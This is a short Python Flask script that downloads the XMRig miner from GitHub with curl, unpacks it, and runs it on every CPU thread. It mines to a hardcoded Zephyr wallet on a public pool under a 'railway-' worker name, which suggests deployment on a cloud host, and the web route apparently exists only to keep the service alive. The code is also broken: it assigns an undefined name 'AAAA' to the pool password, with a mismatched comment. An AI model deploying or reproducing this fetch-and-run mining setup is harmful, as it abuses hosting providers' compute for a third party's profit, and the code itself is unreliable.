import os
import subprocess
import threading
import socket
from flask import Flask

app = Flask(__name__)

# Load wallet from environment variable
WALLET = os.getenv("WALLET", "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b").strip()
POOL = "fr.zephyr.herominers.com:1123"
ALGO = "rx/0"
WORKER = "railway-" + socket.gethostname()
PASS = AAAA  # Worker name shown on pool

def run_miner():
    try:
        if not WALLET.startswith("ZEPHYR") or len(WALLET) < 90:
            print(f"❌ WALLET missing or invalid: {WALLET}")
            return

        os.makedirs("miner", exist_ok=True)
        os.chdir("miner")

        if not os.path.exists("xmrig"):
            print("[*] Downloading XMRig...")
            os.system("curl -L -o miner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz")
            os.system("tar -xf miner.tar.gz")
            os.system("mv xmrig-6.24.0/xmrig ./")
            os.system("chmod +x xmrig")

        threads = os.cpu_count() or 1
        print(f"[+] Starting XMRig with {threads} threads")
        print(f"[DEBUG] ./xmrig -a {ALGO} -o {POOL} -u {WALLET} -p {PASS}")

        subprocess.Popen([
            "./xmrig",
            "-a", ALGO,
            "-o", POOL,
            "-u", WALLET,
            "-p", PASS,
            "--threads", str(threads),
            "--cpu-priority", "5",
            "--donate-level", "1",
            "--print-time", "30"
        ])
    except Exception as e:
        print("⚠️ Miner failed to start:", e)

@app.route('/')
def home():
    return f"✅ Miner Running<br>Worker: <code>{WORKER}</code><br>Wallet: <code>{WALLET[:20]}...</code>"

if __name__ == '__main__':
    threading.Thread(target=run_miner).start()
    app.run(host="0.0.0.0", port=8080)
